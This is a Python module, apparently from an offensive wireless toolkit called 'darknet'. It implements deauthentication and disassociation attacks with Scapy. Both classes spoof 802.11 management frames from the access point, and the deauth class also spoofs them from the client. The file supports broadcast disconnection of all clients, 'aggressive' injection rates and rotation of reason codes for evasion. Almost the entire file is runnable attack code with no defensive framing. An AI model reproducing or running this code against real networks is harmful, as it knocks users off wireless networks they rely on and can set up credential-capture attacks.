"""
Deauthentication attack module
Aggressively disconnects clients from wireless networks
"""

from scapy.all import *
from darknet.core.base import AttackModule
from darknet.core.packet import PacketHandler
from darknet.utils.constants import *
import time
import random


class DeauthAttack(AttackModule):
    """
    Aggressive deauthentication attack
    Supports targeted and broadcast deauth attacks
    """

    def __init__(self):
        super().__init__(
            name="Deauth Attack",
            description="Aggressive deauthentication attack to disconnect clients",
            attack_type=ATTACK_DEAUTH
        )
        self.ap_mac = None
        self.client_mac = None
        self.broadcast = False
        self.packet_count = 100
        self.reason_code = REASON_CLASS3_FRAME_FROM_NONASSOC_STA
        self.injection_rate = INJECTION_RATE_AGGRESSIVE
        self.bidirectional = True
        self.packet_handler = None

    def setup(self, **kwargs) -> bool:
        """
        Setup deauth attack
        Args:
            interface: Wireless interface in monitor mode
            ap_mac: Access point MAC address
            client_mac: Client MAC address (None for broadcast)
            packet_count: Number of packets to send (default: 100)
            reason_code: Deauth reason code (default: 7)
            injection_rate: Packets per second (default: 200)
            bidirectional: Send from both AP and client (default: True)
        """
        try:
            self.interface = kwargs.get('interface')
            self.ap_mac = kwargs.get('ap_mac')
            self.client_mac = kwargs.get('client_mac')
            self.packet_count = kwargs.get('packet_count', 100)
            self.reason_code = kwargs.get('reason_code', REASON_CLASS3_FRAME_FROM_NONASSOC_STA)
            self.injection_rate = kwargs.get('injection_rate', INJECTION_RATE_AGGRESSIVE)
            self.bidirectional = kwargs.get('bidirectional', True)

            if not self.interface:
                self.logger.error("Interface not specified")
                return False

            if not self.ap_mac:
                self.logger.error("AP MAC address not specified")
                return False

            # If no client specified, use broadcast
            if not self.client_mac:
                self.client_mac = "ff:ff:ff:ff:ff:ff"
                self.broadcast = True
                self.logger.info("Using broadcast deauth (will disconnect all clients)")

            self.packet_handler = PacketHandler(self.interface)

            self.logger.info(f"Deauth attack configured:")
            self.logger.info(f"  AP: {self.ap_mac}")
            self.logger.info(f"  Client: {self.client_mac}")
            self.logger.info(f"  Packets: {self.packet_count}")
            self.logger.info(f"  Rate: {self.injection_rate} pps")
            self.logger.info(f"  Bidirectional: {self.bidirectional}")

            return True

        except Exception as e:
            self.logger.error(f"Setup failed: {e}")
            return False

    def run(self) -> dict:
        """Execute the deauth attack"""
        try:
            self.logger.attack(f"Starting aggressive deauth attack on {self.ap_mac}")

            inter = 1.0 / self.injection_rate if self.injection_rate > 0 else 0

            for i in range(self.packet_count):
                if self._stop_event.is_set():
                    break

                # Create deauth packet from AP to client
                pkt1 = RadioTap() / Dot11(
                    type=0,
                    subtype=12,
                    addr1=self.client_mac,
                    addr2=self.ap_mac,
                    addr3=self.ap_mac
                ) / Dot11Deauth(reason=self.reason_code)

                # Send packet
                sendp(pkt1, iface=self.interface, verbose=False)
                self.packets_sent += 1

                # If bidirectional, also send from client to AP
                if self.bidirectional and not self.broadcast:
                    pkt2 = RadioTap() / Dot11(
                        type=0,
                        subtype=12,
                        addr1=self.ap_mac,
                        addr2=self.client_mac,
                        addr3=self.ap_mac
                    ) / Dot11Deauth(reason=self.reason_code)

                    sendp(pkt2, iface=self.interface, verbose=False)
                    self.packets_sent += 1

                # Random reason codes for evasion
                if i % 10 == 0:
                    self.reason_code = random.choice([
                        REASON_UNSPECIFIED,
                        REASON_PREV_AUTH_NOT_VALID,
                        REASON_DEAUTH_LEAVING,
                        REASON_CLASS3_FRAME_FROM_NONASSOC_STA,
                        REASON_4WAY_HANDSHAKE_TIMEOUT
                    ])

                time.sleep(inter)

                # Log progress
                if (i + 1) % 50 == 0:
                    self.logger.info(f"Sent {self.packets_sent} deauth packets")

            self.success_count = self.packets_sent
            self.logger.success(f"Deauth attack completed: {self.packets_sent} packets sent")

            return {
                'success': True,
                'packets_sent': self.packets_sent,
                'target_ap': self.ap_mac,
                'target_client': self.client_mac,
                'broadcast': self.broadcast
            }

        except Exception as e:
            self.logger.error(f"Attack failed: {e}")
            self.failure_count += 1
            return {
                'success': False,
                'error': str(e)
            }

    def stop(self):
        """Stop the attack"""
        self._stop_event.set()
        self.logger.info("Stopping deauth attack")

    def cleanup(self):
        """Cleanup resources"""
        if self.packet_handler:
            self.packet_handler.stop_capture()


class DisassocAttack(AttackModule):
    """
    Disassociation attack
    Similar to deauth but using disassociation frames
    """

    def __init__(self):
        super().__init__(
            name="Disassoc Attack",
            description="Disassociation attack to disconnect clients",
            attack_type=ATTACK_DISASSOC
        )
        self.ap_mac = None
        self.client_mac = None
        self.packet_count = 100
        self.reason_code = REASON_DISASSOC_STA_HAS_LEFT
        self.injection_rate = INJECTION_RATE_AGGRESSIVE

    def setup(self, **kwargs) -> bool:
        """Setup disassoc attack"""
        try:
            self.interface = kwargs.get('interface')
            self.ap_mac = kwargs.get('ap_mac')
            self.client_mac = kwargs.get('client_mac', "ff:ff:ff:ff:ff:ff")
            self.packet_count = kwargs.get('packet_count', 100)
            self.reason_code = kwargs.get('reason_code', REASON_DISASSOC_STA_HAS_LEFT)
            self.injection_rate = kwargs.get('injection_rate', INJECTION_RATE_AGGRESSIVE)

            if not self.interface or not self.ap_mac:
                return False

            return True

        except Exception as e:
            self.logger.error(f"Setup failed: {e}")
            return False

    def run(self) -> dict:
        """Execute disassoc attack"""
        try:
            self.logger.attack(f"Starting disassoc attack on {self.ap_mac}")

            inter = 1.0 / self.injection_rate

            for i in range(self.packet_count):
                if self._stop_event.is_set():
                    break

                pkt = RadioTap() / Dot11(
                    type=0,
                    subtype=10,
                    addr1=self.client_mac,
                    addr2=self.ap_mac,
                    addr3=self.ap_mac
                ) / Dot11Disas(reason=self.reason_code)

                sendp(pkt, iface=self.interface, verbose=False)
                self.packets_sent += 1

                time.sleep(inter)

            self.logger.success(f"Disassoc attack completed: {self.packets_sent} packets sent")

            return {
                'success': True,
                'packets_sent': self.packets_sent
            }

        except Exception as e:
            self.logger.error(f"Attack failed: {e}")
            return {'success': False, 'error': str(e)}

    def stop(self):
        """Stop the attack"""
        self._stop_event.set()

    def cleanup(self):
        """Cleanup resources"""
        pass
